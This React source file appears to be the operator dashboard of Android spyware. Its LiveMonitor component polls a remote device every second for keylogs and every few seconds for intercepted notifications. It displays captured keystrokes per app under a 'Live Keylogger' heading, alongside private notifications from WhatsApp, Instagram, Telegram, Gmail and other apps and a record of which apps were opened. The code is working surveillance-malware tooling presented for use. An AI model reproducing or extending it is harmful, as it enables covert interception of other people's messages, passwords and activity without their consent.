import React, { useRef, useEffect, useState, useMemo } from 'react';

const APP_COLORS = {
  'com.whatsapp': '#25D366',
  'com.instagram.android': '#E1306C',
  'com.facebook.katana': '#1877F2',
  'org.telegram.messenger': '#0088cc',
  'com.snapchat.android': '#FFFC00',
  'com.zhiliaoapp.musically': '#010101',
  'com.twitter.android': '#1DA1F2',
  'com.facebook.orca': '#0099FF',
  'com.google.android.gm': '#EA4335',
};

function getAppColor(pkg) {
  if (!pkg) return '#7c3aed';
  return APP_COLORS[pkg] || '#' + Math.abs(pkg.split('').reduce((h, c) => (h << 5) - h + c.charCodeAt(0), 0) % 0xFFFFFF).toString(16).padStart(6, '7');
}

function appShort(pkg) {
  if (!pkg) return '?';
  const parts = pkg.split('.');
  return parts[parts.length - 1]?.slice(0, 2).toUpperCase() || '??';
}

function friendlyName(entry) {
  return entry?.appName || (entry?.packageName?.split('.').pop()) || 'Unknown';
}

function dedupeKeylogs(entries) {
  const seen = new Set();
  return entries.filter(k => {
    const key = `${k.packageName}|${k.timestamp}|${k.text}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

function dedupeNotifs(entries) {
  const seen = new Set();
  return entries.filter(n => {
    const key = `${n.packageName}|${n.postTime || n.timestamp}|${n.title}|${n.text}`;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });
}

function ColHeader({ icon, title, count, live }) {
  return (
    <div className="lm-col-header">
      <span className="lm-col-icon">{icon}</span>
      <span className="lm-col-title">{title}</span>
      {count !== undefined && <span className="lm-col-count">{count}</span>}
      {live && <span className="lm-live-dot">● LIVE</span>}
    </div>
  );
}

function NotifFeed({ entries }) {
  const endRef = useRef(null);
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [entries.length]);

  if (!entries.length) {
    return (
      <div className="lm-empty">
        <div>🔔</div>
        <div>No notifications</div>
      </div>
    );
  }
  return (
    <div className="lm-feed">
      {entries.map((n, i) => {
        const color = getAppColor(n.packageName);
        return (
          <div key={`n-${i}-${n.postTime}-${n.title}`} className="lm-entry">
            <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
              {appShort(n.packageName)}
            </div>
            <div className="lm-entry-body">
              <div className="lm-entry-row">
                <span className="lm-entry-app" style={{ color }}>{friendlyName(n)}</span>
                <span className="lm-entry-ts">{(n.timestamp || '').slice(11, 19)}</span>
              </div>
              {n.title && <div className="lm-entry-title">{n.title}</div>}
              {n.text && <div className="lm-entry-text">{n.text}</div>}
            </div>
          </div>
        );
      })}
      <div ref={endRef} />
    </div>
  );
}

function ActivityFeed({ entries }) {
  const endRef = useRef(null);
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [entries.length]);

  if (!entries.length) {
    return (
      <div className="lm-empty">
        <div>📱</div>
        <div>No app opens yet</div>
      </div>
    );
  }
  return (
    <div className="lm-feed">
      {entries.map((a, i) => {
        const color = getAppColor(a.packageName);
        return (
          <div key={`a-${i}-${a.timestamp}`} className="lm-entry lm-entry-activity">
            <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
              {appShort(a.packageName)}
            </div>
            <div className="lm-entry-body">
              <div className="lm-entry-row">
                <span className="lm-entry-app" style={{ color }}>{friendlyName(a)}</span>
                <span className="lm-entry-ts">{(a.timestamp || '').slice(11, 19)}</span>
              </div>
              <div className="lm-entry-text lm-pkg">{a.packageName}</div>
            </div>
          </div>
        );
      })}
      <div ref={endRef} />
    </div>
  );
}

function KeylogFeed({ entries }) {
  const endRef = useRef(null);
  useEffect(() => {
    endRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [entries.length]);

  if (!entries.length) {
    return (
      <div className="lm-empty">
        <div>⌨️</div>
        <div>No keystrokes yet</div>
      </div>
    );
  }
  return (
    <div className="lm-feed">
      {entries.map((k, i) => {
        const color = getAppColor(k.packageName);
        return (
          <div key={`k-${i}-${k.timestamp}-${k.text}`} className="lm-entry">
            <div className="lm-badge" style={{ background: color + '22', borderColor: color + '55', color }}>
              {appShort(k.packageName)}
            </div>
            <div className="lm-entry-body">
              <div className="lm-entry-row">
                <span className="lm-entry-app" style={{ color }}>{friendlyName(k)}</span>
                <span className="lm-entry-ts">{(k.timestamp || '').slice(11, 19)}</span>
              </div>
              <div className="lm-keylog-text">{k.text}</div>
            </div>
          </div>
        );
      })}
      <div ref={endRef} />
    </div>
  );
}

export default function LiveMonitor({ notifEntries, activityEntries, keylogEntries, device, sendCommand, results }) {
  const [fetchedKeylogs, setFetchedKeylogs] = useState([]);
  const [fetchedNotifs, setFetchedNotifs]   = useState([]);
  const seenResultIds = useRef(new Set());

  const deviceId = device?.deviceId;
  const isOnline = device?.isOnline;

  // ── Fetch keylogs immediately, then every 1 second ──────────────────
  useEffect(() => {
    if (!isOnline || !sendCommand || !deviceId) return;

    const fetch = () => sendCommand(deviceId, 'get_keylogs', { limit: 200 });
    fetch();
    const id = setInterval(fetch, 1000);
    return () => clearInterval(id);
  }, [isOnline, deviceId, sendCommand]);

  // ── Fetch notifications every 3 seconds (like keylogs) ──────────────
  useEffect(() => {
    if (!isOnline || !sendCommand || !deviceId) return;
    const fetch = () => sendCommand(deviceId, 'get_notifications', { limit: 100 });
    fetch();
    const id = setInterval(fetch, 3000);
    return () => clearInterval(id);
  }, [isOnline, deviceId, sendCommand]);

  // ── Parse command results for keylogs and notifications ─────────────
  useEffect(() => {
    if (!results) return;
    results.forEach(r => {
      if (seenResultIds.current.has(r.id)) return;
      if (!r.success || !r.response) return;
      if (r.command === 'get_keylogs') {
        seenResultIds.current.add(r.id);
        try {
          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          if (d.logs) setFetchedKeylogs(d.logs);
        } catch (_) {}
      }
      if (r.command === 'get_notifications') {
        seenResultIds.current.add(r.id);
        try {
          const d = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          if (d.notifications) {
            setFetchedNotifs(prev => {
              const combined = [...d.notifications, ...prev];
              const seen = new Set();
              return combined.filter(n => {
                const key = `${n.packageName}|${n.postTime}|${n.title}|${n.text}`;
                if (seen.has(key)) return false;
                seen.add(key);
                return true;
              }).slice(0, 100);
            });
          }
        } catch (_) {}
      }
    });
  }, [results]);

  // ── Merge push + fetched, dedupe ────────────────────────────────────
  const notifs = useMemo(() =>
    dedupeNotifs([...(notifEntries || []), ...fetchedNotifs]).slice(0, 100),
    [notifEntries, fetchedNotifs]
  );

  const activity = (activityEntries || []).slice(0, 100);

  const keylogs = useMemo(() =>
    dedupeKeylogs([...(keylogEntries || []), ...fetchedKeylogs]).slice(0, 200),
    [keylogEntries, fetchedKeylogs]
  );

  return (
    <div className="live-monitor">
      <div className="lm-col">
        <ColHeader icon="🔔" title="Notifications" count={notifs.length} live={notifEntries?.length > 0} />
        <NotifFeed entries={notifs} />
      </div>
      <div className="lm-col">
        <ColHeader icon="📱" title="Recent Activity" count={activity.length} />
        <ActivityFeed entries={activity} />
      </div>
      <div className="lm-col">
        <ColHeader icon="⌨️" title="Live Keylogger" count={keylogs.length} live={keylogs.length > 0} />
        <KeylogFeed entries={keylogs} />
      </div>
    </div>
  );
}
